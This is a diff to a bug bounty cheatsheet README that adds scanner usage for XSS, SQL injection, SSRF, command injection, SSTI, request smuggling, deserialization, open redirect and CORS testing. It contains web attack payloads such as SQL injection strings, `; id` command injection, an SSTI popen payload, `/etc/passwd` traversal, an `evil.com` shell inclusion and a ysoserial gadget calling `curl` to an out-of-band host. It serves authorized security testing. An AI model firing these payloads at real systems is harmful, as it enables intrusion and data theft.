@@ -30,6 +30,8 @@ This repository contains a comprehensive and advanced cheatsheet for bug bounty 
     *   [3.14 HTTP Request Smuggling](#314-http-request-smuggling)
     *   [3.15 Prototype Pollution](#315-prototype-pollution)
     *   [3.16 Insecure Deserialization](#316-insecure-deserialization)
+    *   [3.17 Open Redirection](#317-open-redirection)
+    *   [3.18 CORS (Cross-Origin Resource Sharing) Misconfigurations](#318-cors-cross-origin-resource-sharing-misconfigurations)
 5.  [Phase 4: Reporting & Post-Engagement](#phase-4-reporting--post-engagement)
 6.  [Essential Tools Arsenal](#essential-tools-arsenal)
 7.  [Custom Nuclei Templates](#custom-nuclei-templates)
@@ -353,6 +355,35 @@ Automation can only get you so far. This is where your skills come into play. Al
 *   **Reflected XSS:** Input is reflected on the page.
 *   **Stored XSS:** Input is stored in the database and displayed to other users.
 *   **DOM-based XSS:** Payload is executed in the DOM.
+*   **Automated XSS Scanners:**
+    *   **Dalfox:** A powerful, parameter-based XSS scanner.
+        ```bash
+        # Installation
+        go install github.com/hahwul/dalfox/v2@latest
+
+        # Usage from a URL
+        dalfox url http://example.com/?p=1
+
+        # Usage from a file of URLs, checking for stored XSS
+        dalfox file urls.txt --stored
+        ```
+    *   **XSStrike:** An advanced XSS detection suite.
+        ```bash
+        # Installation
+        git clone https://github.com/s0md3v/XSStrike.git
+        pip3 install -r XSStrike/requirements.txt
+
+        # Usage
+        python3 XSStrike/xsstrike.py -u "http://example.com/search.php?q=test"
+        ```
+    *   **kxss:** A simple tool for finding XSS.
+        ```bash
+        # Installation
+        go install github.com/Emoe/kxss@latest
+
+        # Usage
+        echo "http://example.com/search.php?q=test" | kxss
+        ```
 *   **Testing:**
     *   Inject `<script>alert(1)</script>` in every input field.
     *   Use different contexts: `<img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>`.
@@ -367,49 +398,107 @@ Automation can only get you so far. This is where your skills come into play. Al
     *   `' OR 1=1 --`
     *   `' OR '1'='1`
     *   Time-based blind: ` ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --`
-    *   Use `SQLMap` for automation after manual discovery.
+    *   **SQLMap - The Essential Tool:**
         ```bash
+        # Basic scan
         sqlmap -u "https://example.com/vuln.php?id=1" --dbs
+
+        # Advanced Usage: Crawl a site and test all forms
+        sqlmap -u "https://example.com" --forms --batch --crawl=3
+
+        # Test from a file of Burp logs
+        sqlmap -r request.txt -p id --risk=3 --level=5
         ```
-*   **Testing:**
-    *   Look for parameters that take a URL: `?url=`, `?path=`, `?dest=`
-    *   Try to access internal services: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254/latest/meta-data/` (for AWS).
-    *   **Bypass techniques:**
-        *   Use different IP encodings: `http://2130706433` (127.0.0.1), `http://0x7f000001`
-        *   Use alternative URL schemes: `dict://`, `gopher://`
-        *   Utilize DNS rebinding.
+    *   **Ghauri:** A faster, time-based blind SQLi detection tool.
+        ```bash
+        # Installation
+        pip3 install ghauri
+
+        # Usage
+        ghauri -u "http://example.com/product.php?id=1"
+        ```
 
 ### 3.3 Server-Side Request Forgery (SSRF)
 *   **Testing:**
     *   Look for parameters that take a URL: `?url=`, `?path=`, `?dest=`
     *   Try to access internal services: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254/latest/meta-data/` (for AWS).
+    *   **Automated SSRF Detection:**
+        *   **interactsh-client:** Use ProjectDiscovery's interaction server to detect out-of-band requests.
+            ```bash
+            # Installation
+            go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+
+            # 1. Start the client
+            interactsh-client
+
+            # 2. Use the generated URL (e.g., xxx.oast.fun) in your SSRF payloads
+            # Ex: https://example.com/?url=http://xxx.oast.fun
+            ```
+        *   **SSRFmap:** A dedicated SSRF exploitation tool.
+            ```bash
+            # Installation
+            git clone https://github.com/swisskyrepo/SSRFmap
+            pip3 install -r SSRFmap/requirements.txt
+
+            # Usage
+            python3 SSRFmap/ssrfmap.py -r data/request.txt -p url
+            ```
+    *   **Bypass techniques:**
+        *   Use different IP encodings: `http://2130706433` (127.0.0.1), `http://0x7f000001`
+        *   Use alternative URL schemes: `dict://`, `gopher://`
+        *   Utilize DNS rebinding.
 
 ### 3.4 Insecure Direct Object References (IDOR)
 *   **Testing:**
     *   Change IDs in the URL: `/profile/123` -> `/profile/124`
     *   Look for base64 encoded or hashed IDs and try to decode/crack them.
-*   **Testing:**
-    *   `?file=../../../../etc/passwd`
-    *   `?page=http://evil.com/shell.txt`
-    *   **PHP Wrappers for LFI:**
-        *   `php://filter/convert.base64-encode/resource=index.php`
-        *   `zip://archive.zip#shell.php`
+*   **Automated IDOR Discovery:**
+    *   While IDORs are often logic-based, tools can help automate the hunt for vulnerable parameters.
+    *   **Autorize:** A Burp Suite extension that helps detect authorization vulnerabilities by repeating requests with a lower-privileged user's session.
+    *   **ffuf:** Use ffuf to enumerate for numeric IDs.
+        ```bash
+        # Fuzz for numeric IDs from 1 to 1000 on a user profile page
+        ffuf -w /path/to/wordlist/1-1000.txt -u https://example.com/users/FUZZ -H "Cookie: session=..."
+        ```
 
 ### 3.5 Cross-Site Request Forgery (CSRF)
 *   **Testing:**
     *   Check if state-changing requests (e.g., changing email, password) lack anti-CSRF tokens.
     *   If tokens are present, see if they are validated correctly.
+*   **Tool:** "Param Miner" Burp Suite extension is excellent for this.
 
 ### 3.6 Command Injection
 *   **Testing:**
     *   `| id`, `&& id`, `; id`
     *   `$(id)`
     *   `ping -c 1 127.0.0.1; id`
+*   **Automated Command Injection:**
+    *   **commix:** A powerful, automated tool for command injection exploitation.
+        ```bash
+        # Installation
+        git clone https://github.com/commixproject/commix.git
+        cd commix
+
+        # Usage
+        python3 commix.py --url="http://example.com/cmd.php?cmd=id"
+
+        # Test POST data
+        python3 commix.py --url="http://example.com/cmd.php" --data="cmd=id"
+        ```
 
 ### 3.7 Local/Remote File Inclusion (LFI/RFI)
 *   **Testing:**
     *   `?file=../../../../etc/passwd`
     *   `?page=http://evil.com/shell.txt`
+*   **Automated LFI/RFI:**
+    *   **ffuf:** We can use `ffuf` with LFI wordlists to automate discovery.
+        ```bash
+        # Fuzzing for LFI with a wordlist of common files
+        ffuf -w /path/to/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "https://example.com/?page=FUZZ"
+        ```
+*   **PHP Wrappers for LFI:**
+        *   `php://filter/convert.base64-encode/resource=index.php`
+        *   `zip://archive.zip#shell.php`
 
 ### 3.8 Authentication & Authorization Bypass
 *   **Testing:**
@@ -453,6 +542,14 @@ Automation can only get you so far. This is where your skills come into play. Al
     *   **Common Vulnerabilities:**
         *   **Denial of Service (DoS) via nested queries.**
         *   **Authorization bypasses in resolvers.**
+    *   **clairvoyance:** A powerful GraphQL schema discovery tool.
+        ```bash
+        # Installation
+        pip3 install clairvoyance
+
+        # Usage
+        clairvoyance https://example.com/graphql
+        ```
 
 ### 3.10 XXE (XML External Entity)
 *   **Testing:**
@@ -472,6 +569,17 @@ Automation can only get you so far. This is where your skills come into play. Al
         ```
         {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
         ```
+*   **Automated SSTI Detection:**
+    *   **tplmap:** A tool for automating the detection and exploitation of SSTI.
+        ```bash
+        # Installation
+        git clone https://github.com/epinna/tplmap.git
+        cd tplmap
+        pip install -r requirements.txt
+
+        # Usage
+        python2 tplmap.py -u "http://example.com/page?name=test"
+        ```
 
 ### 3.12 Race Conditions
 *   **Testing:**
@@ -488,6 +596,23 @@ Automation can only get you so far. This is where your skills come into play. Al
 
 ### 3.14 HTTP Request Smuggling
 *   This vulnerability arises when the frontend (e.g., a load balancer) and the backend server interpret the boundary of an HTTP request differently.
+*   **Automated Command-Line Tools:**
+    *   **smuggler.py:** The go-to tool for detecting CL.TE and TE.CL vulnerabilities.
+        ```bash
+        # Installation
+        git clone https://github.com/defparam/smuggler.git
+
+        # Usage
+        python3 smuggler/smuggler.py -u https://example.com/
+        ```
+    *   **http2smugl:** Focuses on detecting smuggling via HTTP/2 to HTTP/1.1 conversion.
+        ```bash
+        # Installation
+        go install github.com/neex/http2smugl@latest
+
+        # Usage
+        http2smugl detect https://example.com/
+        ```
 *   **Testing:**
     *   Use Burp Suite's "HTTP Request Smuggler" extension.
     *   Look for differences in how `Content-Length` and `Transfer-Encoding` headers are handled.
@@ -495,18 +620,95 @@ Automation can only get you so far. This is where your skills come into play. Al
 
 ### 3.15 Prototype Pollution
 *   A JavaScript vulnerability where an attacker can modify an object's prototype. This can lead to arbitrary code execution or denial of service.
+*   **Automated Detection:**
+    *   **pp-finder:** A Burp Suite extension to find prototype pollution.
+    *   **ppmap:** A command-line tool for identifying prototype pollution vulnerabilities.
+        ```bash
+        # Installation
+        go install github.com/kleiton0x00/ppmap@latest
+
+        # Usage
+        cat urls.txt | ppmap
+        ```
 *   **Testing:**
     *   Look for unsafe recursive merge functions in JavaScript code.
-    *   Inject payloads like `?__proto__[polluted]=true`.
-    *   **Tools:**
-        *   **pp-finder:** A Burp Suite extension to find prototype pollution.
 
 ### 3.16 Insecure Deserialization
 *   This occurs when an application deserializes untrusted user input without proper validation, leading to remote code execution.
+*   **Payload Generation Tools:**
+    *   **ysoserial:** The ultimate tool for generating Java deserialization payloads.
+        ```bash
+        # Installation
+        # Download the jar from https://github.com/frohoff/ysoserial
+
+        # Usage - Generate a payload for the "CommonsCollections1" gadget
+        java -jar ysoserial.jar CommonsCollections1 'curl http://x.oast.fun' > payload.bin
+        # Then send the payload.bin in the request
+        ```
+    *   **PHPGGC:** A library of PHP unserialize() payloads.
+        ```bash
+        # Installation
+        git clone https://github.com/ambionics/phpggc.git
+
+        # Usage
+        phpggc/phpggc monolog/rce1 system id
+        ```
 *   **Languages & Tools:**
     *   **Java:** Look for serialized objects in HTTP requests (often starting with `ac ed 00 05`). Use the `ysoserial` tool to generate payloads.
-    *   **PHP:** Look for calls to `unserialize()`. Use `PHPGGC` to generate payloads.
-    *   **Python:** Look for `pickle.load()`.
+
+### 3.17 Open Redirection
+*   Occurs when an application redirects users to a URL specified in a user-controlled parameter without proper validation.
+*   **Automated Scanners:**
+    *   **Oralyzer:** A powerful open redirection scanner.
+        ```bash
+        # Installation
+        git clone https://github.com/r0075h3ll/Oralyzer.git
+        pip3 install -r Oralyzer/requirements.txt
+
+        # Usage
+        python3 Oralyzer/oralyzer.py -u "https://example.com/?next=http://google.com"
+        ```
+    *   **OpenRediWrecked:** Uses a curated list of payloads.
+        ```bash
+        # Installation
+        git clone https://github.com/blackhatethicalhacking/OpenRediWrecked.git
+        cd OpenRediWrecked
+        chmod +x OpenRediWrecked.sh
+
+        # Usage
+        ./OpenRediWrecked.sh
+        ```
+
+### 3.18 CORS (Cross-Origin Resource Sharing) Misconfigurations
+*   Improperly configured CORS policies can allow malicious websites to make requests to a victim's domain and read the response.
+*   **Automated Scanners:**
+    *   **Corsy:** A classic CORS misconfiguration scanner.
+        ```bash
+        # Installation
+        git clone https://github.com/s0md3v/Corsy.git
+        pip3 install requests
+
+        # Usage
+        python3 Corsy/corsy.py -u https://example.com/api/user
+        ```
+    *   **CorsOne:** A modern and fast CORS discovery tool.
+        ```bash
+        # Installation
+        git clone https://github.com/omranisecurity/CorsOne.git
+        cd CorsOne
+        python3 -m pip install -r requirements.txt
+
+        # Usage
+        python3 CorsOne.py -u https://example.com/api/user
+        ```
+    *   **ucors:** A go-based tool for finding CORS bypasses.
+        ```bash
+        # Installation
+        go install github.com/wfinn/ucors@latest
+
+        # Usage
+        echo https://example.com/api/user | ucors -c "session=xyz123"
+        ```
 
 ---
 
@@ -641,6 +843,20 @@ A list of must-have tools.
 | cloud-enum  | Cloud Enumeration         | `pip3 install cloud-enum`                  |
 | gospider    | Web Crawler               | `go install ...`                           |
 | hakrawler   | Web Crawler               | `go install ...`                           |
+| commix      | Command Injection         | `git clone ...`                            |
+| tplmap      | SSTI Scanner              | `git clone ...`                            |
+| Dalfox      | XSS Scanner               | `go install ...`                           |
+| XSStrike    | XSS Scanner               | `git clone ...`                            |
+| kxss        | XSS Scanner               | `go install ...`                           |
+| Ghauri      | SQLi Scanner              | `pip3 install ghauri`                      |
+| SSRFmap     | SSRF Exploitation         | `git clone ...`                            |
+| subjack     | Subdomain Takeover        | `go install ...`                           |
+| clairvoyance| GraphQL Scanner           | `pip3 install clairvoyance`                |
+| Oralyzer    | Open Redirection          | `git clone ...`                            |
+| Corsy       | CORS Scanner              | `git clone ...`                            |
+| smuggler.py | HTTP Request Smuggling    | `git clone ...`                            |
+| ysoserial   | Deserialization Payloads  | `wget ...`                                 |
+| ppmap       | Prototype Pollution       | `go install ...`                           |
 
 ---
 
@@ -789,4 +1005,19 @@ http:
           - "Apache Server Status for"
           - "Server Uptime"
         condition: and
-``` 
+```
+
+### Automated Subdomain Takeover Tools
+*   **subjack:** The classic tool for checking a list of subdomains.
+    ```bash
+    # Installation
+    go install github.com/haccer/subjack@latest
+
+    # Usage
+    subjack -w all_subdomains.txt -t 100 -o takeover_results.txt -c /path/to/fingerprints.json
+    ```
+*   **nuclei:** Nuclei also has powerful templates for takeover detection.
+    ```bash
+    # Run takeover templates specifically
+    nuclei -l all_subdomains.txt -t takeovers/
+    ``` 
